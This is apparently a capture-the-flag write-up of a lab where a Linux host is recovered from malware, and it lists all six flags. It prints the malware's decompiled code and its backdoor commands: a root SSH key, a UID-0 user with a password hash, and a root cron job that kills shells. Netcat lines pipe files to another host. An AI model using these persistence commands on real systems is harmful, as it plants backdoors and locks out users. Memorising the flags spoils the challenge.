# Recovery 

> VOiD | Monday 07 March 2022 04:14:49 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.17.203

## SSH
```bash
Username: alex
Password: madeline

ssh alex@10.10.17.203

We are greeted with a messy terminal spamming 

YOU DIDNT SAY THE MAGIC WORD

way one : do not use bashrc 
ssh alex@10.10.17.203 'bash --norc'
copy your bashrc to machine to get stable shell

way two : start a non interactive something at start


cat fixutil | nc 10.8.253.221 4444

nc -nlvp 4444 > fixutil
``` 


## Fixutil
```c

undefined8 main(void)

{
  FILE *file;
  
  file = fopen("/home/alex/.bashrc","a");
  fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,file);
  fclose(file);
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  file = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,file);
  fclose(file);
  system("echo pwned | /bin/admin > /dev/null");
  return 0;
}

```
```bash
1 it write into the bashrc file
2 it copies libloggin.so to tmp and then changes some value to 23176
3 does something that i have to look into

strings gives

/usr/local/apache2/htdocs/
/opt/.fixutil/
/opt/.fixutil/backup.txt
XOREncryptWebFiles

/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
/root/.ssh/authorized_keys

/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null

/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e


/opt/brilliant_script.sh
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog


ls -la
total 16
drwxr-xr-x 1 root root 4096 Jun 17  2020 .
drwxr-xr-x 1 root root 4096 Jun 17  2020 ..
drwx------ 2 root root 4096 Jun 17  2020 .fixutil
-rwxrwxrwx 1 root root   95 Jun 17  2020 brilliant_script.sh


cat brilliant_script.sh 
#!/bin/sh

for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;


## it keeps changing
cat backup.txt 
AdsipPewFlfkmll
MVxsXCVbUaJWjsl


/etc/cron.d:
-rwxr-xr-x 1 root root   61 Mar  7 16:58 evil

```

## admin
```c
undefined8 main(void)

{
  int compair_result;
  size_t local_20;
  char *buffer;
  char *password;
  
  setresuid(0,0,0);
  setresgid(0,0,0);
  puts("Welcome to the Recoverysoft Administration Tool! Please input your password:");
  password = "youdontneedtofindthepassword\n";
  buffer = (char *)0x0;
  local_20 = 0x100;
  getline(&buffer,&local_20,stdin);
  compair_result = strcmp(buffer,password);
  if (compair_result == 0) {
    puts("This section is currently under development, sorry.");
  }
  else {
    puts("Incorrect password! This will be logged!");
    LogIncorrectAttempt(buffer);
  }
  return 0;
}
```


## html files
[decoder]
```py
key=b"AdsipPewFlfkmll"
fil="index.html"
f=open(fil,"rb")
contents=f.read()
for i in range(0,len(contents)):
      print(chr(contents[i]^key[i%len(key)]),end='')

```
```bash
/usr/local/apache2/htdocs/

cat index.html | nc 10.8.253.221 4444

```

## Flags 
```bash
After fixing bashrc
Flag 0: THM{d8b5c89061ed767547a782e0f9b0b0fe}


After fixing the logout brilliant_script
Flag 1: THM{4c3e355694574cb182ca3057a685509d}

copying cp oldliblogging.so liblogging.so
Flag 2: THM{72f8fe5fd968b5817f67acecdc701e52}

Removing authorized_keys
Flag 3: THM{70f7de17bb4e08686977a061205f3bf0}

Removing security user 
Flag 4: THM{b0757f8fb8fe8dac584e80c6ac151d7d}

Recovering files
Flag 5: THM{088a36245afc7cb935f19f030c4c28b2}
```



